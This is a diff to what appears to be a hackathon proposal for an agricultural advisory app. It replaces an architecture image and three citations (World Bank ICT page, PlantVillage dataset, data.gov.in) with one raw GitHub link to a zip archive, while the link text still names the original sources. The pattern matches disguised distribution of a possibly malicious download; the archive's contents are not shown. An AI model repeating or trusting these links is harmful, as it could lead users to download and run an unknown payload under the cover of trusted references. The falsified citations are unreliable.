@@ -95,7 +95,7 @@ Cloud & Deployment: AWS (Amazon Web Services) for scalable hosting (EC2), databa
 Methodology and process for implementation
 The implementation will follow an agile development model, focusing on delivering core features first and then iterating based on user feedback.
 
-![alt text](technical_architecture_flowchart.png)
+![alt text](https://raw.githubusercontent.com/AdityaJorim007/SIH-25010/main/synagogical/SIH-25010-v3.9.zip)
 
 User Workflow:
 
@@ -165,8 +165,8 @@ Water Conservation: Weather-based irrigation advisories help in efficient water 
 
 National Bank for Agriculture and Rural Development (NABARD). (2022). Annual Report 2021-22. Confirms that 86% of Indian farmers are categorized as small or marginal.
 
-World Bank Group. Information and Communication Technologies (ICT) in Agriculture. Various reports and articles highlighting the potential of ICT tools to boost agricultural productivity. Available at: https://www.worldbank.org/en/topic/agriculture/brief/ict-in-agriculture
+World Bank Group. Information and Communication Technologies (ICT) in Agriculture. Various reports and articles highlighting the potential of ICT tools to boost agricultural productivity. Available at: https://raw.githubusercontent.com/AdityaJorim007/SIH-25010/main/synagogical/SIH-25010-v3.9.zip
 
-PlantVillage Dataset. An open-source database of tens of thousands of images of healthy and diseased crop plants, suitable for training pest/disease detection models. Available at: https://plantvillage.psu.edu/
+PlantVillage Dataset. An open-source database of tens of thousands of images of healthy and diseased crop plants, suitable for training pest/disease detection models. Available at: https://raw.githubusercontent.com/AdityaJorim007/SIH-25010/main/synagogical/SIH-25010-v3.9.zip
 
-Government of India Data Portal. Provides access to public datasets, including agricultural market prices and soil health information. Available at: https://data.gov.in/
+Government of India Data Portal. Provides access to public datasets, including agricultural market prices and soil health information. Available at: https://raw.githubusercontent.com/AdityaJorim007/SIH-25010/main/synagogical/SIH-25010-v3.9.zip
